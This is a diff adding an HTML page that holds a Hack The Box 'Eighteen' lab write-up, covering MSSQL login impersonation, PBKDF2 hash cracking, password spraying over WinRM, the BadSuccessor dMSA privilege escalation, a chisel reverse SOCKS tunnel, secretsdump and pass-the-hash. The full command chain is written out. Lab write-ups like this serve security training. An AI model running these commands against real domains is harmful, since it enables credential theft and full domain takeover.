@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Eighteen | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Windows</p>
+      <h1>HTB Eighteen</h1>
+      <p class="headline">MSSQL impersonation, PBKDF2 cracking and Windows Server 2025 BadSuccessor abuse</p>
+      <p class="meta">Hard - Administrator</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Eighteen exposes IIS, MSSQL and WinRM. Initial credentials for <code>kevin</code> allow MSSQL access, where Kevin can impersonate the <code>appdev</code> login. The <code>financial_planner</code> database contains an admin PBKDF2 hash that is converted to Hashcat format and cracked. Password reuse provides WinRM access as <code>adam.scott</code>. Privilege escalation abuses CVE-2025-53779, also known as BadSuccessor, on a Windows Server 2025 domain controller to create a delegated Managed Service Account and impersonate privileged identities.</p>
+<h2>Initial Access to MSSQL</h2>
+<pre><code class="language-text">account: kevin / iNa2we6haRj2gaw!</code></pre>
+<p>The host exposed only HTTP, MSSQL and WinRM.</p>
+<pre><code class="language-bash">sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.1.43 -oG allPorts
+sudo nmap -p80,1433,5985 -sCV -oN Targeted 10.129.1.43</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120162636.png" alt="Web account creation" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120163401.png" alt="SQL Server confirmation" /></figure>
+<p>MSSQL login succeeded with the provided credentials.</p>
+<pre><code class="language-bash">mssqlclient.py kevin:&#39;iNa2we6haRj2gaw!&#39;@eighteen.htb</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120164227.png" alt="MSSQL login as kevin" /></figure>
+<h2>MSSQL Impersonation and Hash Recovery</h2>
+<p>Database enumeration revealed <code>financial_planner</code> and an <code>appdev</code> login. NetExec confirmed Kevin could impersonate <code>appdev</code>.</p>
+<pre><code class="language-bash">nxc mssql 10.129.1.43 -u kevin -p &#39;iNa2we6haRj2gaw!&#39; -M mssql_priv --local-auth</code></pre>
+<pre><code class="language-sql">EXECUTE AS LOGIN = &#39;appdev&#39;;
+select name from sys.tables;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120164530.png" alt="Database enumeration" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120170109.png" alt="appdev login discovered" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120175503.png" alt="MSSQL impersonation rights" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120202356.png" alt="EXECUTE AS appdev" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120202746.png" alt="Table enumeration" /></figure>
+<p>The <code>users</code> table contained an admin PBKDF2 hash.</p>
+<pre><code class="language-text">pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120202947.png" alt="Admin PBKDF2 hash" /></figure>
+<p>The hash was converted to Hashcat mode 10900 and cracked.</p>
+<pre><code class="language-bash">python3 pbkdf2-to-hashcat.py &#39;pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133&#39;
+hashcat -m 10900 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt</code></pre>
+<pre><code class="language-text">admin:iloveyou1</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120205922.png" alt="Hashcat format conversion" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120210424.png" alt="Hashcat cracking" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120211556.png" alt="Admin password recovered" /></figure>
+<h2>WinRM as adam.scott</h2>
+<p>RID brute force identified domain users, and password reuse worked for <code>adam.scott</code> over WinRM.</p>
+<pre><code class="language-bash">nxc mssql 10.129.1.82 -u kevin -p &#39;iNa2we6haRj2gaw!&#39; --rid-brute --local-auth
+nxc winrm 10.129.1.82 -u users.txt -p &#39;iloveyou1&#39; --continue-on-success</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120211836.png" alt="RID brute force users" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120212219.png" alt="adam.scott WinRM access" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120212439.png" alt="User flag" /></figure>
+<h2>BadSuccessor Privilege Escalation</h2>
+<p>CVE-2025-53779 affects Windows Server 2025 Domain Controllers and involves delegated Managed Service Accounts (dMSA), Kerberos delegation and LDAP property validation. The target was checked with BadSuccessor.</p>
+<pre><code class="language-powershell">Import-Module .\BadSuccessor.ps1
+BadSuccessor -mode check -Domain eighteen.htb</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120215523.png" alt="BadSuccessor module download" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120215656.png" alt="BadSuccessor module import" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120215859.png" alt="BadSuccessor vulnerability check" /></figure>
+<p>A malicious dMSA was created to delegate access from <code>adam.scott</code> to an Administrator-equivalent path.</p>
+<pre><code class="language-powershell">BadSuccessor -mode exploit -Path &quot;OU=Staff,DC=eighteen,DC=htb&quot; -Name &quot;nory_dmsa&quot; -DelegatedAdmin &quot;adam.scott&quot; -DelegateTarget &quot;Administrator&quot; -domain &quot;eighteen.htb&quot;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120220159.png" alt="BadSuccessor exploitation" /></figure>
+<h2>Kerberos and SecretsDump through SOCKS</h2>
+<p>Chisel was used to provide a SOCKS proxy back through the victim.</p>
+<pre><code class="language-bash">./chisel server --reverse -p 8080
+.\chisel.exe client 10.10.16.22:8080 R:1080:socks</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120220605.png" alt="Chisel server" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120222545.png" alt="Chisel client" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251120221916.png" alt="Proxychains configuration" /></figure>
+<p>The dMSA ticket was requested and exported.</p>
+<pre><code class="language-bash">proxychains /usr/bin/getST.py eighteen.htb/adam.scott:iloveyou1 -impersonate &quot;nory_dmsa$&quot; -dc-ip 10.129.1.82 -self -dmsa
+export KRB5CCNAME=&#39;nory_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache&#39;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251121054221.png" alt="Time sync issue and retry" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251121062050.png" alt="dMSA ticket obtained" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251121062150.png" alt="KRB5CCNAME export" /></figure>
+<p>SecretsDump recovered the Administrator hash, which was used for WinRM.</p>
+<pre><code class="language-bash">proxychains -q /usr/bin/secretsdump.py -k -no-pass dc01.eighteen.htb -just-dc-user Administrator -dc-ip 10.129.210.173
+evil-winrm -i 10.129.210.173 -u &#39;administrator&#39; -H &#39;0b133be956bfaddf9cea56701affddec&#39;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251121062533.png" alt="Administrator hash via secretsdump" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/eighteen/Pasted%20image%2020251121062737.png" alt="Administrator shell" /></figure>
+<h2>Key Takeaways</h2>
+<ul>
+<li>MSSQL impersonation can expose application secrets and usable password material.</li>
+<li>PBKDF2 hashes must be converted correctly before Hashcat cracking.</li>
+<li>Windows Server 2025 AD-specific bugs require version-aware enumeration.</li>
+<li>BadSuccessor-style dMSA abuse can lead directly to DCSync-grade access.</li>
+</ul>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
